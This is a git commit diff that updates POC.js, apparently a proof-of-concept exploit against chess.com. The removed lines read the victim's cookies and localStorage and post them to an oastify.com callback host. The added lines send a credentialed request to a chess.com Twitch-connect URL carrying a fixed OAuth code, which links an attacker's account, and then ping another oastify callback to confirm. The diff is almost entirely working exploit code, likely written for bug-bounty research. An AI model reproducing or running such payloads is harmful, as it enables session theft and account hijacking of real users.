89c5cb9f870467c6c6dca1eaa67319933d0781a3
Hussein Mahmoud <housien.a.khalek19@gmail.com>
2026-04-29 21:26:29 +0300

    Update POC.js

--- POC.js
+++ POC.js
@@ -1,14 +1,12 @@
 
+var hackerCallbackUrl = "https://www.chess.com/twitch/connect?code=4jmjaa72a19vzr16e1674u1pbi9xfq&scope=user_read+viewing_activity_read+user_subscriptions&state=4e13c18a1af79282d354f443108f9fed"; 
 
-
-var userCookies = document.cookie;
-var userStorage = JSON.stringify(localStorage);
-
-
-var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
-
-fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/", {
-    method: "POST",  
-    mode: "no-cors",     
-    body: exfilData     
+fetch(hackerCallbackUrl, {
+    method: 'GET',
+    credentials: 'include' 
+})
+.then(response => {
+    if (response.ok) {
+        fetch("https://g0ht46bti8mfmyhnj3nivao8mzsqgi47.oastify.com/?impact=Twitch_Linked_Successfully");
+    }
 });
